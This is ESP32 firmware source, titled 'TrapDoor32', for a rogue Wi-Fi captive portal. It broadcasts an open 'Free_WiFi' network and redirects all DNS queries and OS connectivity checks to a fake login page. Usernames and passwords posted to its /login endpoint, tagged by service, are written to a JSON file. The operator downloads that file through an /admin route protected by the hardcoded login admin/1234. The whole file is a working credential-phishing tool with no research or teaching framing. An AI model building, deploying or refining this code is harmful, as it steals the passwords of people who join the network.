#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <TFT_eSPI.h>

#define TFT_BL 4  // backlight control pin

// SoftAP configuration
const char* ssid        = "Free_WiFi";
const IPAddress localIP(192,168,4,1);
const IPAddress gateway(192,168,4,1);
const IPAddress subnet(255,255,255,0);
const byte    DNS_PORT  = 53;

// Admin credentials for JSON download
const char* adminUser   = "admin";
const char* adminPwd    = "1234";

DNSServer      dnsServer;
AsyncWebServer server(80);
TFT_eSPI       tft;

// store credentials, keep last 50 entries
void saveCred(const String &svc, const String &user, const String &pass) {
  StaticJsonDocument<1024> doc;
  if (SPIFFS.exists("/creds.json")) {
    File fr = SPIFFS.open("/creds.json", FILE_READ);
    if (fr) { deserializeJson(doc, fr); fr.close(); }
  }
  JsonArray arr = doc.containsKey("entries")
                ? doc["entries"].as<JsonArray>()
                : doc.createNestedArray("entries");
  JsonObject entry = arr.createNestedObject();
  entry["service"] = svc;
  entry["user"]    = user;
  entry["pass"]    = pass;
  while (arr.size() > 50) arr.remove(0);
  File fw = SPIFFS.open("/creds.json", FILE_WRITE);
  if (fw) { serializeJson(doc, fw); fw.close(); }
}

// redirect all unknown requests to captive page
void handleNotFound(AsyncWebServerRequest *req) {
  req->redirect(String("http://") + localIP.toString() + "/");
}

void setup() {
  Serial.begin(115200);
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS init failed");
    return;
  }

  // start AP + DNS
  WiFi.softAPConfig(localIP, gateway, subnet);
  WiFi.softAP(ssid);
  dnsServer.start(DNS_PORT, "*", localIP);
  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());

  // serve captive page & assets
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *req){
    req->send(SPIFFS, "/captive.html", "text/html");
  });
  server.serveStatic("/style.css", SPIFFS, "/style.css");
  server.serveStatic("/script.js", SPIFFS, "/script.js");
  server.serveStatic("/icons/",    SPIFFS, "/icons/");

  // handle login JSON body
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *req){},
    nullptr,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t, size_t) {
      DynamicJsonDocument j(512);
      if (deserializeJson(j, data, len) == DeserializationError::Ok) {
        saveCred(j["service"].as<String>(),
                 j["user"].as<String>(),
                 j["pass"].as<String>());
        req->send(204);
      } else {
        req->send(400, "application/json", "{\"error\":\"invalid JSON\"}");
      }
    }
  );

  // captive-detection endpoints
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *req){ req->send(204); });
  server.on("/ncsi.txt",      HTTP_GET, [](AsyncWebServerRequest *req){ req->send(204); });
  server.on("/hotspot-detect.html", HTTP_ANY, handleNotFound);
  server.on("/library/test/success.html", HTTP_ANY, handleNotFound);
  server.on("/fwlink",        HTTP_ANY, handleNotFound);
  server.onNotFound(handleNotFound);

  // admin JSON download (protected)
  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *req){
    if (!req->authenticate(adminUser, adminPwd))
      return req->requestAuthentication();
    req->send(SPIFFS, "/creds.json", "application/json");
  });

  server.begin();

  // init display
  tft.init();
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.drawString("TrapDoor32", 10, 10);
  tft.setCursor(10, 40);
  tft.println("Ready");
}

void loop() {
  dnsServer.processNextRequest();
}
